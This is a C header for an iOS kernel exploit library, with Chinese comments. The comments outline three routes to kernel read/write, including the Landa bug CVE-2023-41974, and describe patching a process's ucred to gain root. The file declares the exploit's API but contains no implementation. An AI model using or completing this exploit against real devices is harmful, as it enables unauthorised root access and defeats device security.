//
//  kfd.h
//  iOS kernel exploit — 多路径内核提权
//
//  路径 1: task_for_pid(0) → Mach VM 直接读写
//    适用 iOS 15.0-15.4.1。利用 TrollStore 注入的 system-task-ports
//    权限直接获取 kernel_task 端口，通过 mach_vm_read/write 读写内核内存。
//
//  路径 2: host_get_special_port(HOST_PRIV,4) → Mach VM 读写
//    部分 iOS 15.x 版本仍开放此端口。
//
//  路径 3: Landa (CVE-2023-41974) + IOSurface 内核 r/w
//    适用 iOS 15.7.4-15.8.x（task_for_pid(0) 被内核封锁）。
//    通过 vm_remap 共享映射 + mlock 竞态释放内核物理页面，
//    利用 IOSurface IOKit 调用实现任意内核 r/w。
//    参考: alfiecg24/Vertex
//
//  == 提权流程 ==
//  1. kfd_init() → 版本检测 + 偏移匹配
//  2. kfd_open() → 尝试路径1 → 路径2 → 路径3
//  3. kfd_get_root() → 遍历 allproc 找到当前 proc
//  4. 修改 ucred.cr_uid/cr_ruid/cr_svuid/cr_rgid/cr_svgid = 0
//  5. setuid(0) 让用户态同步感知 root
//
//  运行环境: TrollStore iOS 15-17, arm64
//

#ifndef KFD_H
#define KFD_H

#include <stdint.h>
#include <stdbool.h>
#include <sys/types.h>
#include <mach/mach.h>

// ---- 内核版本信息 ----
typedef struct {
    uint32_t major;
    uint32_t minor;
    uint32_t patch;
    char     build[32];
} kfd_osversion_t;

// ---- kfd 状态 ----
typedef enum {
    KFD_ERR_NONE = 0,
    KFD_ERR_OPEN_FAILED,
    KFD_ERR_NO_SUITABLE_TECHNIQUE,
    KFD_ERR_UNSUPPORTED_OS,
    KFD_ERR_KERNEL_RW_FAILED,
    KFD_ERR_CRED_PATCH_FAILED,
} kfd_error_t;

// ---- 公开 API ----

/// 初始化 kfd 内部数据结构（偏移表、版本检测等），返回 0 表示成功。
int kfd_init(void);

/// 尝试通过 task_for_pid(0)/host_get_special_port/Landa 获取内核 r/w 能力，返回 0 表示成功。
int kfd_open(void);

/// 将当前进程提权为 UID=0（root），通过修改内核 ucred 结构实现，返回 0 表示成功。
int kfd_get_root(void);

/// 关闭 kfd 句柄并清理。
void kfd_close(void);

/// 完整的提权流程: init → open → get_root，返回 0 表示成功。
/// 成功时当前进程的 EUID 已变为 0。
int kfd_escalate(void);

/// 提权指定 PID 的进程（通过 allproc 链表找到并修改其 ucred）。
/// 需要先 kfd_open 成功。
int kfd_escalate_pid(pid_t pid);

/// 检查当前进程是否已经获得 root 权限。
/// 返回 1 = 已是 root, 0 = 不是。
int kfd_is_root(void);

/// 获取最后一次错误描述。
const char *kfd_get_error(void);

#endif // KFD_H
